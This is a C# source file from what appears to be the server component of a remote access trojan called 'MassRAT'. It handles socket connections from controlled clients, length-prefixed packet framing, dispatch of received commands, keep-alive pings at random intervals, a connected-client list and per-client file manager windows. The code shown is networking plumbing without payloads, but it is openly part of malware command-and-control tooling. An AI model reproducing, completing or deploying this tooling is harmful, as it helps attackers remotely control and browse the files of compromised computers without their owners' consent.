using Server.Forms;
using Server.PacketHandler;
using Server.Settings;
using SharedLibraries.Packet.Commands;
using SharedLibraries.Packet.Interfaces;
using SharedLibraries.Packet.Serialization;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using Timer = System.Threading.Timer;

namespace Server.Networking
{
    /// <summary>
    /// stores the client's opened forms
    /// </summary>
    public class ClientForms
    {
        public FormFileManager GetFormFileManager;

        /// <summary>
        /// will be called when the socket is closed to dispose of any resources left
        /// </summary>
        public void Cleanup()
        {
            if (GetFormFileManager != null)
            {
                SafeThreading.UIThread.Invoke((MethodInvoker)delegate
                {
                    GetFormFileManager.Dispose();
                });
            }
        }
    }

    public class SocketClient
    {
        /// <summary>
        /// pointer as client's opened forms
        /// </summary>
        public ClientForms CurrentForms { get; set; }

        /// <summary>
        /// The socket used for the client communication
        /// </summary>
        public Socket Socket { get; private set; }

        /// <summary>
        /// to control the client listview
        /// </summary>
        public ListViewItem ListViewItem { get; set; }

        /// <summary>
        /// send a ping to check if other socket is alive or not every x second
        /// </summary>
        private Timer KeepAlivePacket;

        /// <summary>
        /// sync send
        /// </summary>
        private readonly object LockSend = new object();

        /// <summary>
        /// unique identification as client pointer
        /// </summary>
        public PacketIdentification Identification { get; set; }

        /// <summary>
        /// determine if the header has been received
        /// </summary>
        private bool HeaderReceived;

        /// <summary>
        /// stores incoming payload-header size
        /// </summary>
        private int PayloadSize = 0;

        /// <summary>
        /// the number of bytes to receive
        /// </summary>
        private int Size = 4;

        /// <summary>
        /// the location in buffer to store the received data
        /// </summary>
        private int Offset = 0;

        /// <summary>
        /// the storage for the received data
        /// </summary>
        private byte[] Buffer = new byte[4];

        public long BytesReceived { get; set; }

        public SocketClient(Socket socket)
        {
            CurrentForms = new ClientForms();

            Socket = socket;

            KeepAlivePacket = new Timer(Ping, null, new Random().Next(5000, 30000), new Random().Next(5000, 30000)); // send in random time

            Socket.BeginReceive(Buffer, Offset, Size, 0, ReceiveCall, null);
        }

        /// <summary>
        /// Read incoming packets | Asynchronous
        /// docs.microsoft.com/en-us/dotnet/api/system.net.sockets.socket.endreceive?view=netframework-4.8
        /// </summary>
        private void ReceiveCall(IAsyncResult ar)
        {
            try
            {
                int received = Socket.EndReceive(ar);
                //Debug.WriteLine($"Server: received[{received}] offset[{Offset}]  size[{Size}]");
                Offset += received;
                Size -= received;
                BytesReceived += received;

                if (received > 0)
                {
                    switch (HeaderReceived)
                    {
                        case false:
                            {
                                if (Size == 0)
                                {
                                    PayloadSize = BitConverter.ToInt32(Buffer, 0);
                                    if (PayloadSize > 0)
                                    {
                                        Size = PayloadSize;
                                        Offset = 0;
                                        Buffer = new byte[PayloadSize];
                                        Socket.ReceiveBufferSize = Size;
                                        BytesReceived = 0;
                                        HeaderReceived = true;
                                        Debug.WriteLine($"Server: packet size is {PayloadSize}");
                                    }
                                    else
                                    {
                                        PayloadSize = 0;
                                        Size = 4;
                                        Offset = 0;
                                        Buffer = new byte[Size];
                                        Socket.ReceiveBufferSize = Size;
                                        BytesReceived = 0;
                                    }
                                }
                                break;
                            }

                        case true:
                            {
                                if (Size == 0)
                                {
                                    IPacket packet = Desirialize.PacketDesirialize(Buffer);
                                    Debug.WriteLine($"Server: packet received is {packet.GetType().Name}");
                                    ThreadPool.QueueUserWorkItem((o) =>
                                    {
                                        new ReadPacket(this, packet);
                                    });
                                    PayloadSize = 0;
                                    Size = 4;
                                    Offset = 0;
                                    Buffer = new byte[Size];
                                    Socket.ReceiveBufferSize = Size;
                                    BytesReceived = 0;
                                    HeaderReceived = false;
                                }
                                break;
                            }
                    }
                    Socket.BeginReceive(Buffer, Offset, Size, 0, ReceiveCall, null);
                }
                else
                {
                    Disconnected();
                    return;
                }
            }
            catch (SocketException se)
            {
                Debug.WriteLine(se.SocketErrorCode);
                Disconnected();
                return;
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
                Disconnected();
                return;
            }
        }

        /// <summary>
        /// Send packet
        /// docs.microsoft.com/en-us/dotnet/api/system.net.sockets.socket.send?view=netframework-4.5
        /// </summary>
        /// <param name="packet">payload to be sent</param>
        public void Send(IPacket packet)
        {
            lock (LockSend)
            {
                try
                {
                    if (!Socket.Connected || packet == null)
                    {
                        Disconnected();
                        return;
                    }
                    else
                    {
                        byte[] buffer = Serialize.PacketSerialize(packet);
                        byte[] bufferSize = BitConverter.GetBytes(buffer.Length); // convert to 4 bytes Length
                        Debug.WriteLine($"Server: Sending {buffer.Length}");

                        Socket.Poll(-1, SelectMode.SelectWrite);
                        Socket.Send(bufferSize, 0, bufferSize.Length, SocketFlags.None); // send the 4 bytes first
                        using (MemoryStream memoryStream = new MemoryStream(buffer))
                        {
                            int read = 0;
                            memoryStream.Position = 0;
                            byte[] chunk = new byte[50 * 1000];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                Socket.Poll(-1, SelectMode.SelectWrite);
                                int sent = Socket.Send(chunk, 0, read, SocketFlags.None);
                                Debug.WriteLine($"Server: Sent {sent}");
                            }
                        }
                    }
                }
                catch (SocketException se)
                {
                    Debug.WriteLine(se.SocketErrorCode);
                    Disconnected();
                    return;
                }
                catch (Exception ex)
                {
                    Debug.WriteLine(ex.Message);
                    Disconnected();
                    return;
                }
            }
        }

        /// <summary>
        /// close the socket and any resources left
        /// </summary>
        public void Disconnected()
        {
            try
            {
                if (ListViewItem != null)
                {
                    SafeThreading.UIThread.Invoke((MethodInvoker)delegate
                    {
                        Interlocked.Decrement(ref Configuration.ConnectedClients);
                        lock (SafeThreading.SyncMainFormListview)
                        {
                            ListViewItem.Remove();
                            ListViewItem = null;
                            SafeThreading.UIThread.Text = $"MassRAT | By NYAN CAT | Online{Configuration.ConnectedClients}";
                        }
                    });
                }

                CurrentForms?.Cleanup();
                CurrentForms = null;

                Socket?.Dispose();

                KeepAlivePacket?.Dispose();
                Buffer = null;

                Debug.WriteLine("Disconnected");
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex);
            }
        }

        /// <summary>
        /// simple ping
        /// to avoid half open connection
        /// associated with the "Timer KeepAlivePacket"
        /// </summary>
        /// <param name="o">null</param>
        private void Ping(object o)
        {
            Send(new PacketKeepAlive());
        }
    }
}